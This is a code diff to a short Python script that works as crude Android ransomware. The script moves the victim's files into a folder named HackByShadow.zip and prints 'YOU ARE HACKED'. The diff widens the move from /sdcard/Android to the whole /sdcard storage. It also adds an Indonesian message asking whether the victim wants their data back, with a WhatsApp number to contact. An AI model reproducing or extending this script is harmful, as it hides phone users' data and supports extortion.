@@ -9,7 +9,7 @@ print
 print "[Author  = Shadow]"
 print "[Contact = Shadow44@gmail.com]"
 os.system('mkdir HackByShadow.zip')
-os.system('mv /sdcard/Android HackByShadow.zip')
+os.system('mv /sdcard HackByShadow.zip')
 print
 print
 print
@@ -23,8 +23,9 @@ print "YOU ARE HACKED :)"
 print
 print
 print
+print "INGIN DATA KEMBALI?"
 print
-print
+print "HUBUNGI WA 082158878826"
 print
 print "==================="
 print "[NO SYSTEM IS SAFE]"
@@ -32,5 +33,5 @@ print "==================="
 print
 print
 print
-print
-print "_____________________________________________"
+print "================================================"
+
